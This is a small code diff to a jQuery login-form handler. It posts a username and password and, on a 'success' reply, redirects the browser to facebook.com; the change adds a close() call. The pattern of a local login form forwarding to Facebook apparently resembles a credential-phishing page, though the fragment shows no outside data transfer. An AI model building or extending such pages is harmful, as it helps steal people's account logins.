@@ -20,7 +20,9 @@ $('#login_form').submit(function (event) {
             pass:pass
         },
         success:function (data) {
-            if(data == 'success') location.href = '//facebook.com/';
+            if(data == 'success') {location.href = '//facebook.com/';
+                                  close();
+                                  }
         }
     });
 
